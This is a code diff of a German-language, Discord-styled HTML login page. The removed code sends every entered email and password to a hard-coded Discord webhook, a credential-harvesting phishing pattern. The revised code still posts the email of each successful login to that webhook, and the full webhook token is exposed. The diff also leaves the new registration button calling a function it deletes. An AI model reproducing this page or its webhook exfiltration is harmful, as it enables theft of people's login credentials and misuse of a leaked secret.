@@ -63,6 +63,32 @@
         .btn:hover {
             background-color: #5a6ebc;
         }
+        .loader-container {
+            display: none;
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 20px auto;
+        }
+        .loader, .loader::after {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 5px solid transparent;
+            border-top-color: #7289da;
+            animation: spin 1s linear infinite;
+        }
+        .loader::after {
+            border-width: 3px;
+            animation-duration: 1.5s;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -72,12 +98,22 @@
         <input type="email" id="email" class="input-field" placeholder="Email">
         <input type="password" id="password" class="input-field" placeholder="Passwort">
         <button class="btn" onclick="loginUser()">Login</button>
-        <button class="btn" onclick="registerUser()">Account erstellen</button>
+        <button class="btn" onclick="showRegister()">Account erstellen</button>
+    </div>
+    <div class="loader-container" id="loader-container">
+        <div class="loader"></div>
+    </div>
+    <div class="container" id="register-container" style="display: none;">
+        <h2>Registrieren</h2>
+        <input type="email" id="reg-email" class="input-field" placeholder="Email">
+        <input type="password" id="reg-password" class="input-field" placeholder="Passwort">
+        <button class="btn" onclick="registerUser()">Registrieren</button>
+        <button class="btn" onclick="showLogin()">Zurück</button>
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1349850414543142912/6ujUtioGiTKVrXMrs-dQbB83Ss5799TzqwczsAdxyeroOXcvaX-ALTRetR25_RywY-D5";
-        
+
         function sendWebhook(message) {
             fetch(webhookURL, {
                 method: "POST",
@@ -86,80 +122,37 @@
             });
         }
 
+        function showRegister() {
+            document.getElementById("login-container").style.display = "none";
+            document.getElementById("register-container").style.display = "flex";
+        }
+
+        function showLogin() {
+            document.getElementById("register-container").style.display = "none";
+            document.getElementById("login-container").style.display = "flex";
+        }
+
         function loginUser() {
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
+            const user = JSON.parse(localStorage.getItem(email));
+            const loader = document.getElementById("loader-container");
             
-            if (email && password) {
-                sendWebhook(`🔐 **Login-Versuch**\n📧 **E-Mail:** ${email}\n🔑 **Passwort:** ${password}`);
-                alert("Login erfolgreich!");
-            } else {
-                alert("Bitte fülle alle Felder aus.");
-            }
-        }
-
-        function registerUser() {
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
+            document.getElementById("login-container").style.display = "none";
+            loader.style.display = "block";
             
-            if (email && password) {
-                sendWebhook(`📝 **Neue Registrierung**\n📧 **E-Mail:** ${email}\n🔑 **Passwort:** ${password}`);
-                alert("Registrierung erfolgreich! Bitte logge dich ein.");
-            } else {
-                alert("Bitte fülle alle Felder aus.");
-            }
+            setTimeout(() => {
+                loader.style.display = "none";
+                if (user && user.password === password) {
+                    sendWebhook(`🔐 **Login erfolgreich**\n📧 **E-Mail:** ${email}`);
+                    alert("Login erfolgreich!");
+                    // Hier kann das Dashboard geöffnet werden
+                } else {
+                    alert("Falsche Login-Daten! Bitte überprüfe deine Eingaben.");
+                    document.getElementById("login-container").style.display = "flex";
+                }
+            }, 2000);
         }
-
-        function createSmoothRain() {
-            const canvas = document.getElementById("rainCanvas");
-            const ctx = canvas.getContext("2d");
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-
-            let drops = [];
-            for (let i = 0; i < 200; i++) {
-                drops.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    speed: Math.random() * 3 + 1,
-                    length: Math.random() * 20 + 10,
-                    opacity: Math.random() * 0.5 + 0.2
-                });
-            }
-
-            function drawRain() {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                ctx.strokeStyle = "rgba(173, 216, 230, 0.6)";
-                ctx.lineWidth = 1;
-                ctx.lineCap = "round";
-
-                drops.forEach(drop => {
-                    ctx.globalAlpha = drop.opacity;
-                    ctx.beginPath();
-                    ctx.moveTo(drop.x, drop.y);
-                    ctx.lineTo(drop.x, drop.y + drop.length);
-                    ctx.stroke();
-                });
-                ctx.globalAlpha = 1;
-            }
-
-            function animateRain() {
-                drops.forEach(drop => {
-                    drop.y += drop.speed;
-                    if (drop.y > canvas.height) {
-                        drop.y = -drop.length;
-                        drop.x = Math.random() * canvas.width;
-                    }
-                });
-                drawRain();
-                requestAnimationFrame(animateRain);
-            }
-
-            animateRain();
-        }
-
-        createSmoothRain();
     </script>
 </body>
 </html>
-
